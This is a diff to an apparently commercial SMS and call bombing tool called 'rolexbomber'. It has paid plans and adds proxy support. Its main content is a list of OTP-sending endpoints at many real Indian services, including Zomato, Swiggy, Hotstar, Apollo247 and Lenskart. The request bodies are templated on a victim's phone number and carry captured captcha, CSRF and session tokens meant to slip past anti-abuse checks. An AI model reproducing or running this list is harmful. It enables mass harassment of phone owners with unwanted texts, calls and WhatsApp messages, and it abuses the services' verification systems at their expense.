@@ -141,6 +141,10 @@ WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
 USE_WEBHOOK = os.environ.get("USE_WEBHOOK", "false").lower() == "true"
 DB_PATH = os.environ.get("DB_PATH", os.path.join(os.path.dirname(os.path.abspath(__file__)), "rolexbomber.db"))
 
+# ========== PROXY SUPPORT (DISABLED BY DEFAULT) ==========
+PROXY_URL = os.environ.get("PROXY_URL", "")
+USE_PROXY = os.environ.get("USE_PROXY", "false").lower() == "true"
+
 PLANS = {
     "standard": {"name": "Standard", "price": 149, "days": 30, "concurrent": 2, "max_duration": 300},
     "premium": {"name": "Premium", "price": 249, "days": 30, "concurrent": 5, "max_duration": 720},
@@ -397,13 +401,11 @@ class SqliteStorage:
 
 db = None
 
-# ========== COMPLETE API LIST (92+ APIs) ==========
+# ========== COMPLETE API LIST (120 APIs) ==========
 def build_api_list():
     apis = []
     
-    # ========== ORIGINAL APIS (1-80) ==========
-    
-    # 1. NoBroker - SMS
+    # ====== 1. NoBroker - SMS ======
     apis.append({
         "name": "NoBroker_SMS",
         "url": "https://www.nobroker.in/api/v3/account/otp/send",
@@ -418,7 +420,7 @@ def build_api_list():
         "body": {"phone": "{no}", "countryCode": "IN"}
     })
     
-    # 2. Housing - WhatsApp
+    # ====== 2. Housing - WhatsApp ======
     apis.append({
         "name": "Housing_WhatsApp",
         "url": "https://mightyzeus-mum.housing.com/api/gql",
@@ -430,10 +432,13 @@ def build_api_list():
             "Content-Type": "application/json; charset=UTF-8",
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
         },
-        "body": {"query": "mutation($phone: String, $userAgent: String, $otpLength: Int, $preference: String) { sendOtp(phone: $phone, userAgent: $userAgent, otpLength: $otpLength, preference: $preference) { success message } }", "variables": {"phone": "{no}", "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "otpLength": 4, "preference": "whatsapp"}}
+        "body": {
+            "query": "mutation($phone: String, $userAgent: String, $otpLength: Int, $preference: String) { sendOtp(phone: $phone, userAgent: $userAgent, otpLength: $otpLength, preference: $preference) { success message } }",
+            "variables": {"phone": "{no}", "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "otpLength": 4, "preference": "whatsapp"}
+        }
     })
     
-    # 3. Housing - SMS
+    # ====== 3. Housing - SMS ======
     apis.append({
         "name": "Housing_SMS",
         "url": "https://mightyzeus-mum.housing.com/api/gql",
@@ -445,10 +450,13 @@ def build_api_list():
             "Content-Type": "application/json; charset=UTF-8",
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
         },
-        "body": {"query": "mutation($phone: String, $userAgent: String, $otpLength: Int) { sendOtp(phone: $phone, userAgent: $userAgent, otpLength: $otpLength) { success message } }", "variables": {"phone": "{no}", "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "otpLength": 4}}
+        "body": {
+            "query": "mutation($phone: String, $userAgent: String, $otpLength: Int) { sendOtp(phone: $phone, userAgent: $userAgent, otpLength: $otpLength) { success message } }",
+            "variables": {"phone": "{no}", "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "otpLength": 4}
+        }
     })
     
-    # 4. Zomato - SMS
+    # ====== 4. Zomato - SMS ======
     apis.append({
         "name": "Zomato_SMS",
         "url": "https://accounts.zomato.com/login/phone",
@@ -462,7 +470,7 @@ def build_api_list():
         "body": {"number": "{no}", "country_id": "1", "lc": "bed7238d427f41e7a34ea6ea134d2628", "type": "initiate", "verification_type": "sms", "package_name": "com.application.zomato", "message_uuid": ""}
     })
     
-    # 5. Zomato - Call
+    # ====== 5. Zomato - Call ======
     apis.append({
         "name": "Zomato_Call",
         "url": "https://accounts.zomato.com/login/phone",
@@ -476,7 +484,7 @@ def build_api_list():
         "body": {"number": "{no}", "country_id": "1", "lc": "bed7238d427f41e7a34ea6ea134d2628", "type": "initiate", "verification_type": "call", "package_name": "", "message_uuid": "sms-service-v2-12cf2bdc-7cd9-4e1a-9cd1-6470f83d56f0"}
     })
     
-    # 6. Zomato - WhatsApp
+    # ====== 6. Zomato - WhatsApp ======
     apis.append({
         "name": "Zomato_WhatsApp",
         "url": "https://accounts.zomato.com/login/phone",
@@ -490,7 +498,7 @@ def build_api_list():
         "body": {"number": "{no}", "country_id": "1", "lc": "af07c17656e641efbfcc489f51aea946", "type": "initiate", "verification_type": "whatsapp", "package_name": "", "message_uuid": ""}
     })
     
-    # 7. Refyne - SMS
+    # ====== 7. Refyne - SMS ======
     apis.append({
         "name": "Refyne_SMS",
         "url": "https://prod-api.refyne.co.in/auth/v3/send-otp",
@@ -504,7 +512,7 @@ def build_api_list():
         "body": {"channel": "SMS", "recipient": "{no}"}
     })
     
-    # 8. Refyne - Call
+    # ====== 8. Refyne - Call ======
     apis.append({
         "name": "Refyne_Call",
         "url": "https://prod-api.refyne.co.in/auth/v3/send-otp",
@@ -518,7 +526,7 @@ def build_api_list():
         "body": {"channel": "IVR", "recipient": "{no}"}
     })
     
-    # 9. Refyne - WhatsApp
+    # ====== 9. Refyne - WhatsApp ======
     apis.append({
         "name": "Refyne_WhatsApp",
         "url": "https://prod-api.refyne.co.in/auth/v3/send-otp",
@@ -532,7 +540,7 @@ def build_api_list():
         "body": {"channel": "WHATSAPP", "recipient": "{no}"}
     })
     
-    # 10. Rapido
+    # ====== 10. Rapido ======
     apis.append({
         "name": "Rapido_GenerateOTP",
         "url": "https://customer.rapido.bike/api/customer/v2/generateOtp",
@@ -547,7 +555,7 @@ def build_api_list():
         "body": {"deviceDetails": {"androidId": "", "appId": "2", "deviceId": "13d0b5bd46e271ca", "firebaseToken": "cejGtzeATDCDAjgxrdjMpG", "manufacturer": "google", "model": "Pixel 4", "timeStamp": "0", "firebaseAppInstanceId": "8a36cb89a513fac0eaac67b9bb716f2f"}, "mobile": "{no}"}
     })
     
-    # 11. Rapido - WhatsApp Resend
+    # ====== 11. Rapido - WhatsApp Resend ======
     apis.append({
         "name": "Rapido_WhatsApp_Resend",
         "url": "https://customer.rapido.bike/api/customer/whatsApp/v2/resendOtp",
@@ -562,7 +570,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # 12. EazyDiner - SMS
+    # ====== 12. EazyDiner - SMS ======
     apis.append({
         "name": "EazyDiner_SMS",
         "url": "https://force.eazydiner.com/4.1/otp?medium=android",
@@ -580,7 +588,7 @@ def build_api_list():
         "body": {"mobile": "+{no}"}
     })
     
-    # 13. EazyDiner - WhatsApp
+    # ====== 13. EazyDiner - WhatsApp ======
     apis.append({
         "name": "EazyDiner_WhatsApp",
         "url": "https://force.eazydiner.com/4.1/otp?medium=android",
@@ -598,7 +606,7 @@ def build_api_list():
         "body": {"mobile": "+{no}", "whatsapp": "1"}
     })
     
-    # 14. GoMechanic
+    # ====== 14. GoMechanic ======
     apis.append({
         "name": "GoMechanic",
         "url": "https://gomechanic.app/api/v2/send_otp",
@@ -620,7 +628,7 @@ def build_api_list():
         "body": {"hash": "cfN9tRcI8/y", "number": "{no}", "random_id": "5f2ue", "token": "c8b9b119701c5668829cd6acc8aa053bcf1003f6642a55f0a39a80db905f24d1"}
     })
     
-    # 15. IndustryBuying
+    # ====== 15. IndustryBuying ======
     apis.append({
         "name": "IndustryBuying",
         "url": "https://api.industrybuying.com/api/users/action",
@@ -640,7 +648,7 @@ def build_api_list():
         "body": {"pageUri": "/user/register?loginId=", "moduleType": "USERS", "requestType": "ACTION", "pageType": "USER", "userContext": {"action": "VERIFY_USER", "payload": {"loginId": "{no}", "isLoginModule": False, "businessIdentificationVerified": False, "emailId": "temp@gmail.com", "fullName": "temp", "ibCredit": True, "mobileNo": "{no}", "mobileNoVerified": False}, "url": None}, "shouldHardReload": True}
     })
     
-    # 16. Badho Initiate
+    # ====== 16. Badho Initiate ======
     apis.append({
         "name": "Badho_Initiate",
         "url": "https://auth.badho.in/api/authentication/initiate",
@@ -654,7 +662,7 @@ def build_api_list():
         "body": {"env": "production", "platform": "android", "phoneNumber": "{no}", "appName": "buyer", "token": "0cAFcWeA797B78eeflCRX-9LAycLJYX3SrlpHdLT3KmxtpyM5QaQNY2DcuPKuENYDro7TzO1ulAh6JrUpGKhWAYAWdafRAA_LNvc1LCi9zOk3m7Ft1ERO0m06v0amVG6--Aw1cqF6LHyhSIvru_jtJA8l-U2GnqSgOIDcdhryhDMZNhEyq-bY1Dur1hc7hR64p1NWHemiemLju2-tBj673DvYXfgGQNSJkdIb7yglQO1TewFGvWYwBUW-FWuqXGtKsreBk8ZA7Vn2ryGpUHBde5cuR5I6nM8SWoP1yDZFnRIqcI_6laCzH0sUD0Jdmhy-pkrvT9tn57KPX-q9CHzFDXJMbNmij8fngN9uYAgEkcBPXde-AO_w7PLWQrSTmKJkjM_69vot9AgFqnhmWVkKg1oMH42an6fP9W_vtYvOtJfNFULiH1Ptr98SftdZJMeRLlwySOwkHmXb0ctKcn696c7RBrDrktnQoxf15aYRZ9ncI-s-rNCU3HoMMdlTsIntvfJMZR7MKsAjI7JSM0yCkNwGgScmrA6Z9NRuO5SqVm_o-xndu-kp_K_iufLC1UVxlPvVNTHrfjmsBtviPQ7IxqDx-KSihdpiEAa6Fw31aWZfHrtkagsTf7SKeTBRhUXRoSWJHUJS9Q-NG0ksy76o6fxN2oKqp3Xd-SXFyB_fhbAgUkGjJau67rl_iWR6amlBY6wdTdMZxjLRYvTpLgs2y4r1uHfhu0-05aveYyE_5VOu7mWIu2FeWX3x0vA3X1801NgA-jKEVtlSiHGoFRut6Pytl8vkVi8LdIyeURu2_y8HM0pPTWzOH0MnFlkb8sqXhC5-3FHtBfsg7qK7f-6G8ZOPVOCgupc_XBnZyrKhv9vVRswE7QjvS3qUfmC6lzhHiWr1lOadk_8NDES62GsYXYkHPZiTKvB4iqeEPXIPzVfkIIlTe6EVz2Q9dnhZu7FVjNbFFIUiP9AH80uoQZ_F8A9Tbka3RweabgNBpt2ZMgzi4kSY2HN_iKf2MXy5ss3BQiYtPIPhQyzStvRZdYoKmViLJir_mkRDbGXSD2JEuL1j0fpyHlJ6Uenhdv5rTDb5xkZyLJ0ZLxK_4dWXmoAN2wSeCcn1hSTcDv1xwOIW0LCgag6NiwG85g7_ckr1bUpZZ_1RP8pcLj627tY3S0vy6nlTbkdBUAxbrl2Z2Eb6rBHNN0metAujE5R0306iyZvCifccyqrSjAaDe6K_-DJkfWtKAA9RUZq-vc0LX8kihlFo9OjzO4-RyCx6cq1U1R6RqjEc8Wf-NUco9DCN41u2XhYDLmo6C5V3p0Dr2haPg8sbafQ2Owh1I7BiG-euwd4QRetkxryerZPVxBu-TRHOdprTZV7ILyDufBMjfFMRuGku_-HQDth3qwr_DUWE_qFR_oZofN3SVpzQXx3vddZCFoOvTPsUP4TfrsbDty5a2a0zL1Kkbq5GM7R2lwoLLAKhdV6CHUI0D2z4bMudAR-dkWg_oqB2kd3gj0qX9yH1aHhum1OWnrv4a48N3pVBw9gtgw4zCVcC_fb6bi0xYalzWzSZoHuLFQczujn2g20k_YghKma2pnG4lnyo71aICoAIvsx56Ygic0kU8XFamCjzIc7t2huOWHrGO1G0jI2NoCRSQDbrfUef-AWafr-Fk0K4msQNPjm4y9yNe1bkNydxVMRZvFgh2h5G1kh0_omx45NfA6Ix8Yjtq5DqRP9kxbKss4AhoLPL1cW1ChuPgGG3LaAjqxFqEN5eO8-gc3UVr8nX0anoxszXXrTfPsZnCxe0FkEvVhhHjjm--xA0scnB1Vv1QuhVGtT2qEWJw67LoaIR7xMyAFFOILv0m2k7dk2pYLIak4Nb2F2AmpmS_aEcapPYM_-ZfeZAUXJiJImd53bQb8nOzYpLLHLNJliV_hYoJLHllmy0SyGw4H4yWVIBmLcP_ECkn3eTr2O7RIoRlxfRJ7LRWCd7MmmyQZTUeFDuVfQhOUlkbhscZ3Z6l6Yj9gCX4IcF2SukN_PAkogFOKKS9hyERIHq9JmfP5ohIV_AnKt8gKqd2LZ6Huqiz7WZJbgxil_kyCu6wY29ygTXCk4bOWn-iFEbVYJ86czmhmLimBpFZOwtj1ZnixaODD0CbpIkbilcpGSldyE2m6iqUttXOOOjvkCh8dxyLsOt9-IJG2sO-eFno8Ue7d_aSNVhSjzahCl82_1O8EbQ6wNSP1c7dKdSkLguPGf_I0Lm7YOg_tQMbyRNNLz15KsPpKnyiKlQ1dp3T5DYZ34auLsvwtQBhvyKQclevsp19xxX-Cn162Gj8UWGU2YkAuvEoBivSJrclhBxIqhgeTkZQXhvT2FHfGb4QWpzlneKNsAj7muOcqs3byLS9zM61tUq8cFv1tBXjhE4hOmVCW7ie9Z1nRhYuCx8kOrlAXoOQm5D-oPKQNw865cckmzOBeOqpVaZQ_BtSZS10PTcbkzqmwxJhLSeTxMeIoT5eH4dxHe8DdTJSesNUH3R6i_M2nWiAH0C0msphiKTgcx0kumN7u3vJmoiwpVs-OubRV2w-HJ4G10utRGLwu34kmFavxgPolGFid0hUF1KHY8hVGL0pBGwX7mOpTpt65s6Z3AU", "appId": "2391550b-7f93-4b02-8043-60a8646ec4f4", "contextToken": None, "otpHashCode": "vkfCtgDqUPU"}
     })
     
-    # 17. Badho Call
+    # ====== 17. Badho Call ======
     apis.append({
         "name": "Badho_Call",
         "url": "https://auth.badho.in/api/authentication/send-otp-via-phone-call",
@@ -668,7 +676,7 @@ def build_api_list():
         "body": {"contextToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJPVFBFbnRyeUlkIjoiM2I2NWJjNjgtMWYwOC00M2E2LWJlMGUtMDE3Mjk4NDk0YzNkIiwiaWF0IjoxNzU3NjY2OTMwLCJleHAiOjE3NjAyNTg5MzB9.0IWP-jXL-msPIuVlKoCd7U1dyMEEZDMPidaZMDzl9VY", "phoneNumber": "{no}", "appName": "buyer"}
     })
     
-    # 18. Urbanic - SMS
+    # ====== 18. Urbanic - SMS ======
     apis.append({
         "name": "Urbanic_SMS",
         "url": "https://api-shop-in.urbanic.com/n/api/buyer/basic/otp/sendCode",
@@ -686,7 +694,7 @@ def build_api_list():
         "body": {"bizTraceId": "be35ec943fee4d58a32727b2adfe9f9f", "channel": 1, "phonePrefix": "+91", "type": 0, "userName": "{no}"}
     })
     
-    # 19. Urbanic - WhatsApp
+    # ====== 19. Urbanic - WhatsApp ======
     apis.append({
         "name": "Urbanic_WhatsApp",
         "url": "https://api-shop-in.urbanic.com/n/api/buyer/basic/otp/sendCode",
@@ -704,7 +712,7 @@ def build_api_list():
         "body": {"bizTraceId": "be35ec943fee4d58a32727b2adfe9f9f", "channel": 2, "phonePrefix": "+91", "type": 0, "userName": "{no}"}
     })
     
-    # 20. Spinny
+    # ====== 20. Spinny ======
     apis.append({
         "name": "Spinny",
         "url": "https://api.spinny.com/api/c/user/otp-request/",
@@ -719,7 +727,7 @@ def build_api_list():
         "body": {"contact_number": "{no}", "whatsapp": False, "code_len": 4}
     })
     
-    # 21. AstroYogi - Generate OTP
+    # ====== 21. AstroYogi - Generate OTP ======
     apis.append({
         "name": "AstroYogi_GenerateOtp",
         "url": "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
@@ -734,7 +742,7 @@ def build_api_list():
         "body": {"PhoneNumber": "{no}", "PhoneCode": "91", "Domain": "Web", "CountryId": "IN", "IpAddress": "117.234.73.154", "CountryCodeByHeader": "IN"}
     })
     
-    # 22. AstroYogi - Call
+    # ====== 22. AstroYogi - Call ======
     apis.append({
         "name": "AstroYogi_Call",
         "url": "https://comm.astroyogi.com/api/OtpComm/SendOtp",
@@ -749,7 +757,7 @@ def build_api_list():
         "body": {"phoneCode": "91", "countryCode": "IN", "mobileNumber": "{no}", "platform": "Web", "IpAddress": "117.234.73.154", "requestType": "call", "countryCodeByHeader": "IN"}
     })
     
-    # 23. AstroYogi - WhatsApp
+    # ====== 23. AstroYogi - WhatsApp ======
     apis.append({
         "name": "AstroYogi_WhatsApp",
         "url": "https://comm.astroyogi.com/api/OtpComm/SendOtp",
@@ -764,7 +772,7 @@ def build_api_list():
         "body": {"phoneCode": "91", "countryCode": "IN", "mobileNumber": "{no}", "platform": "Web", "IpAddress": "117.234.73.154", "requestType": "whatsapp", "countryCodeByHeader": "IN"}
     })
     
-    # 24. AnytimeAstro
+    # ====== 24. AnytimeAstro ======
     apis.append({
         "name": "AnytimeAstro",
         "url": "https://www.anytimeastro.com/account/registermobile/",
@@ -778,7 +786,7 @@ def build_api_list():
         "body": {"ContactMobile": "{no}", "MobCode": "%2B91", "trackingUrl": "", "ReferralCode": "", "reCaptchaResponse": "", "AcceptHuman": "true", "CountryCode": "in", "ConfirmMobile": "", "AcceptHumanenabled": "1", "captchaenabled": "0", "__RequestVerificationToken": "Iyj_j-I3vZHWeCuJ9PdDFF1yZqK3j9vCBb9YtXcD44UkzDahjHKmOR226JJC-nkOT_fLQCQ0IwMoVSiHdMHhaxRineJJYZh1X_bXSzDMukk1"}
     })
     
-    # 25. Milkbasket - Voice
+    # ====== 25. Milkbasket - Voice ======
     apis.append({
         "name": "Milkbasket_Voice",
         "url": "https://consumerbff.milkbasket.com/graphql",
@@ -800,7 +808,7 @@ def build_api_list():
         "body": {"operationName": "registerNumber", "variables": {"phone": "{no}", "retry": True, "retryType": "voice", "appHash": "", "udid": "QZg2sH1J6vHLMwDK"}, "query": "mutation registerNumber($phone: String!, $retry: Boolean!, $retryType: String!, $appHash: String!, $udid: String!) { registerPhoneNumber(phone: $phone retry: $retry retryType: $retryType appHash: $appHash udid: $udid) { status error errorMsg otpBlockTime __typename } }"}
     })
     
-    # 26. Apollo247
+    # ====== 26. Apollo247 ======
     apis.append({
         "name": "Apollo247",
         "url": "https://apigateway.apollo247.in/auth-service/generateOtp",
@@ -816,7 +824,7 @@ def build_api_list():
         "body": {"loginType": "PATIENT", "mobileNumber": "+{no}"}
     })
     
-    # 27. BharatMatrimony
+    # ====== 27. BharatMatrimony ======
     apis.append({
         "name": "BharatMatrimony",
         "url": "https://greg.bharatmatrimony.com/",
@@ -832,7 +840,7 @@ def build_api_list():
         "body": {"operationName": "SendRegistrationOTP", "variables": {"input": {"motherTongue": "TAMIL", "registerId": 119702837, "registrationToken": "5a88de4e6473364a9d4f8dc32f5bb2af~IfJLlQLb3bw6Tr/PCXKXpyraj3wu8hJ7cDLLhUCkCQs=", "device": {}, "deviceToken": "WEB"}}, "query": "mutation SendRegistrationOTP($input: RegisterId) { sendRegistrationOTP(input: $input) { sessionValue status __typename } }"}
     })
     
-    # 28. Jeevansathi
+    # ====== 28. Jeevansathi ======
     apis.append({
         "name": "Jeevansathi",
         "url": "https://www.jeevansathi.com/app-gateway/auth/v1/phone/otp",
@@ -848,7 +856,7 @@ def build_api_list():
         "body": {"userId": "{no}", "isd": "91", "otpType": "LOGIN_PROFILE"}
     })
     
-    # 29. Yatra
+    # ====== 29. Yatra ======
     apis.append({
         "name": "Yatra",
         "url": "https://www.yatra.com/social/common/yatra/sendMobileOTP",
@@ -861,7 +869,7 @@ def build_api_list():
         "body": {"isdCode": "91", "mobileNumber": "{no}"}
     })
     
-    # 30. Cleartrip
+    # ====== 30. Cleartrip ======
     apis.append({
         "name": "Cleartrip",
         "url": "https://www.cleartrip.com/accounts/external-api/otp",
@@ -885,7 +893,7 @@ def build_api_list():
         "body": {"value": "{no}", "type": "MOBILE", "action": "SIGNIN", "countryCode": "+91"}
     })
     
-    # 31. Swiggy
+    # ====== 31. Swiggy ======
     apis.append({
         "name": "Swiggy",
         "url": "https://www.swiggy.com/mapi/auth/sms-otp",
@@ -900,7 +908,7 @@ def build_api_list():
         "body": {"mobile": "{no}", "_csrf": "3eux3tggHIFM-af_1Dssqu1f6xuveWY1yqrm0ggI"}
     })
     
-    # 32. Snitch
+    # ====== 32. Snitch ======
     apis.append({
         "name": "Snitch",
         "url": "https://www.snitch.com/api/auth/send-otp",
@@ -913,7 +921,7 @@ def build_api_list():
         "body": {"mobile_number": "+{no}"}
     })
     
-    # 33. Snitch - Voice Resend
+    # ====== 33. Snitch - Voice Resend ======
     apis.append({
         "name": "Snitch_Voice",
         "url": "https://www.snitch.com/api/auth/resend-otp",
@@ -927,7 +935,7 @@ def build_api_list():
         "body": {"mobile_number": "+{no}"}
     })
     
-    # 34. SonyLIV - SMS
+    # ====== 34. SonyLIV - SMS ======
     apis.append({
         "name": "SonyLIV_SMS",
         "url": "https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2",
@@ -944,7 +952,7 @@ def build_api_list():
         "body": {"mobileNumber": "{no}", "smsType": "SMS", "channelPartnerID": "MSMIND", "country": "IN", "timestamp": "2026-08-07T17:42:34.848Z", "otpSize": 4, "isMobileMandatory": True, "loginType": "REGISTERORSIGNIN"}
     })
     
-    # 35. SonyLIV - Voice
+    # ====== 35. SonyLIV - Voice ======
     apis.append({
         "name": "SonyLIV_Voice",
         "url": "https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2",
@@ -961,7 +969,7 @@ def build_api_list():
         "body": {"mobileNumber": "{no}", "smsType": "Voice", "channelPartnerID": "MSMIND", "country": "IN", "timestamp": "2026-08-07T17:44:15.343Z", "otpSize": 4, "isMobileMandatory": True, "loginType": "REGISTERORSIGNIN"}
     })
     
-    # 36. ManMatters
+    # ====== 36. ManMatters ======
     apis.append({
         "name": "ManMatters",
         "url": "https://api.manmatters.com/portal/auth/send-otp",
@@ -976,7 +984,7 @@ def build_api_list():
         "body": {"phoneNumber": "{no}", "source": "", "resend": False}
     })
     
-    # 37. IGP
+    # ====== 37. IGP ======
     apis.append({
         "name": "IGP",
         "url": "https://www.igp.com/v2/loginSignup",
@@ -990,7 +998,7 @@ def build_api_list():
         "body": {"email": "", "mprefix": "91", "mob": "{no}", "cid": "99", "claimNumber": False, "newUserFlag": False, "verifyOtp": False, "otp": "", "isGuest": False, "isInternational": False}
     })
     
-    # 38. Kredmint
+    # ====== 38. Kredmint ======
     apis.append({
         "name": "Kredmint",
         "url": "https://merchant-v2.kredmint.in/api/auth/login/",
@@ -1004,7 +1012,7 @@ def build_api_list():
         "body": {"username": "{no}", "medium": "SMS", "meta": {}, "turnstileToken": "1.Y4lF4_kF4DZPijh3QGxr2LqBqM9RyhW1-z9CKgm-399Plkgy4faMshxKaJIzRZ2_7p9QxHMrcqfdS7TcsAx31JOPyqYd9lvj6Vrzm-_Y-SO8S9RMpd93jM7CPS-al2aq85zySTxBULA6YIlFDuCNby904mxmmnwBOvRCvqWULRn9C-cLorbHbry-k7fN7dfR8ZCE2aSkTOmRJhlmKZe_NfaL9wOA_nuC1ZgdWy5uGimKbNJz7q028fXucEZvMMn5tJfhjaxR12ZyXgq5K1VbQKQ-fXIp9WRvMd6S8F0Wi-CrMFA9tpeCavGghIL_wnQ8COyHo-RqxOxXofBsuczgy4VQ_RVwM4Iv9aPiVnS68xIerijMsugpRgj9DySqz0_re6583IR0HFV5ZiAYSQLE26D9WXhnlSyHV4R4EqDtxV7xQYDHrmBTMEL-h_3qgdzOGNZrMtsiHtzdgnOFwnEEKIQl55KKaD9QxIGzB6hdJfLs6R6oK13VBqSMGAQuP-MypvmSWz4X-6WOjbvsCqg5Dx4k2xgihgDzJSarLt8ViqylQIGJeFUYTZ4-_bFL4Y2dWTdHagvolYlR51-n6u_ltcmX3kdoDaB6SbpqkWh05jGS0x42W3UOxGUr8PTPL7Bp5QwUUA3Oept9iNM695vOdA2X8e4etzt4ETTe7w2GvoMa0g47X_B4neQ-53spGNIp.RhNi-8Xn1u2wamFaRlQfoA.eca3d52f2e64f7fbbfc37438773a17dbf34a79432848e8de6c7cd4773483d098"}
     })
     
-    # 39. Codfirm/Clinikally - SMS
+    # ====== 39. Codfirm/Clinikally - SMS ======
     apis.append({
         "name": "Codfirm_SMS",
         "url": "https://api.codfirm.in/api/customers/login/otp/send",
@@ -1017,7 +1025,7 @@ def build_api_list():
         "body": {"medium": "sms", "storeUrl": "clinikally.myshopify.com", "phone": "{no}"}
     })
     
-    # 40. Codfirm/Clinikally - WhatsApp
+    # ====== 40. Codfirm/Clinikally - WhatsApp ======
     apis.append({
         "name": "Codfirm_WhatsApp",
         "url": "https://api.codfirm.in/api/customers/login/otp/send",
@@ -1030,7 +1038,7 @@ def build_api_list():
         "body": {"medium": "whatsapp", "storeUrl": "clinikally.myshopify.com", "phone": "{no}", "resendOtp": True}
     })
     
-    # 41. Apna
+    # ====== 41. Apna ======
     apis.append({
         "name": "Apna",
         "url": "https://production.apna.co/api/userprofile/v1/otp/",
@@ -1043,7 +1051,7 @@ def build_api_list():
         "body": {"phone_number": "91{no}", "retries": 0, "hash_type": "employer", "source": "employer"}
     })
     
-    # 42. CityMall
+    # ====== 42. CityMall ======
     apis.append({
         "name": "CityMall",
         "url": "https://citymall.live/api/gateway/cl-user/auth/get-otp",
@@ -1060,7 +1068,7 @@ def build_api_list():
         "body": {"phone_number": "{no}"}
     })
     
-    # 43. Here/HDFC
+    # ====== 43. Here/HDFC ======
     apis.append({
         "name": "Here_HDFC",
         "url": "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal",
@@ -1072,7 +1080,7 @@ def build_api_list():
         "body": {"mobile": "{no}", "countryCodeId": "b43569eb-6798-43fb-8d27-47d55d7c544b", "source": "sms"}
     })
     
-    # 44. GetLook
+    # ====== 44. GetLook ======
     apis.append({
         "name": "GetLook",
         "url": "https://getlook.in/login/v1/api",
@@ -1085,7 +1093,7 @@ def build_api_list():
         "body": {"phone": "{no}"}
     })
     
-    # 45. KPNFresh
+    # ====== 45. KPNFresh ======
     apis.append({
         "name": "KPNFresh",
         "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
@@ -1102,7 +1110,7 @@ def build_api_list():
         "body": {"phone_number": {"number": "{no}", "country_code": "+91"}}
     })
     
-    # 46. Lenskart
+    # ====== 46. Lenskart ======
     apis.append({
         "name": "Lenskart",
         "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
@@ -1120,7 +1128,7 @@ def build_api_list():
         "body": {"captcha": None, "phoneCode": "+91", "telephone": "{no}"}
     })
     
-    # 47. Savana - SMS
+    # ====== 47. Savana - SMS ======
     apis.append({
         "name": "Savana_SMS",
         "url": "https://api-shop-in.savana.com/n/api/buyer/basic/otp/sendCode",
@@ -1142,7 +1150,7 @@ def build_api_list():
         "body": {"userName": "{no}", "type": 0, "channel": 1, "bizTraceId": "93d67a64fa6b4ca4bee136f9a2470d97", "phonePrefix": "+91"}
     })
     
-    # 48. Savana - WhatsApp
+    # ====== 48. Savana - WhatsApp ======
     apis.append({
         "name": "Savana_WhatsApp",
         "url": "https://api-shop-in.savana.com/n/api/buyer/basic/otp/sendCode",
@@ -1164,7 +1172,7 @@ def build_api_list():
         "body": {"userName": "{no}", "type": 0, "channel": "2", "bizTraceId": "93d67a64fa6b4ca4bee136f9a2470d97", "phonePrefix": "+91"}
     })
     
-    # 49. Ixigo - SMS
+    # ====== 49. Ixigo - SMS ======
     apis.append({
         "name": "Ixigo_SMS",
         "url": "https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp",
@@ -1183,7 +1191,7 @@ def build_api_list():
         "body": {"token": "0239bfc7bb3df5dc4bfb0553a58ae8d900c13e2e3a297c6cddcff5ebfc44b44e62d5f7051b24d93a0935f1911aabff78fd3a15b15d71ec9ed7539a331d295a4f", "sixDigitOTP": "true", "prefix": "%2B91", "phone": "{no}", "resendOnCall": "false"}
     })
     
-    # 50. Ixigo - Call
+    # ====== 50. Ixigo - Call ======
     apis.append({
         "name": "Ixigo_Call",
         "url": "https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp",
@@ -1202,7 +1210,7 @@ def build_api_list():
         "body": {"token": "16df49a87cf210e360ffe104da4f8fb57c52bcc12dbb3d87b1e988861a294d5501aa2510a96afbdf0dd2ede402ad2f64c0f203d5db9f9f15ee491737dce77fa4", "sixDigitOTP": "true", "prefix": "%2B91", "phone": "{no}", "resendOnCall": "true"}
     })
     
-    # 51. Hotstar - SMS
+    # ====== 51. Hotstar - SMS ======
     apis.append({
         "name": "Hotstar_SMS",
         "url": "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8",
@@ -1220,7 +1228,7 @@ def build_api_list():
         "body": {"body": {"@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest", "phone_number": "{no}", "initiate_by": 0, "recaptcha_token": "", "source": 0}}
     })
     
-    # 52. Hotstar - Call
+    # ====== 52. Hotstar - Call ======
     apis.append({
         "name": "Hotstar_Call",
         "url": "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8",
@@ -1238,7 +1246,7 @@ def build_api_list():
         "body": {"body": {"@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest", "phone_number": "{no}", "initiate_by": 1, "recaptcha_token": "", "source": 0}}
     })
     
-    # 53. Happi Mobiles
+    # ====== 53. Happi Mobiles ======
     apis.append({
         "name": "HappiMobiles",
         "url": "https://dev-services.happimobiles.com/api/user-login/homepage",
@@ -1250,7 +1258,7 @@ def build_api_list():
         "body": {}
     })
     
-    # 54. VisitApp - SMS
+    # ====== 54. VisitApp - SMS ======
     apis.append({
         "name": "VisitApp_SMS",
         "url": "https://api.getvisitapp.com/v3/new-auth/login-phone",
@@ -1263,7 +1271,7 @@ def build_api_list():
         "body": {"phone": "{no}", "countryCode": 91, "platform": "WEB", "ssoInfo": None, "storedUTMParams": {}, "emailCode": "", "evId": ""}
     })
     
-    # 55. VisitApp - WhatsApp
+    # ====== 55. VisitApp - WhatsApp ======
     apis.append({
         "name": "VisitApp_WhatsApp",
         "url": "https://api.getvisitapp.com/v3/new-auth/login-phone",
